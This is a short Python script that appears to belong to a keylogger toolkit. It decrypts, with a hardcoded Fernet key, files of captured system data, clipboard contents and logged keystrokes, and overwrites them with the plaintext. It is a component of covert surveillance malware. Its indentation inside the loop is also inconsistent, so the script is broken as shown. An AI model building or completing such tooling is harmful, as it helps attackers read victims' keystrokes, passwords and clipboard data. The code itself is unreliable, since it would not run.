from cryptography.fernet import Fernet

key = "HK6R8PL5yhXhD1RnxBrwibnS7atZWQCfSevWNQ33BOs="

system_information_encryption = "e_system.txt"
clipboard_information_encryption = "e_clipboard.txt"
keys_information_encryption = "e_keys_logged.txt"

encrypted_files = [system_information_encryption, clipboard_information_encryption, keys_information_encryption]
count = 0

for decrypting_file in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        decrypted = fernet.decrypt(data)

        with open(encrypted_files[count], 'wb') as f:
            f.write(decrypted)

        count += 1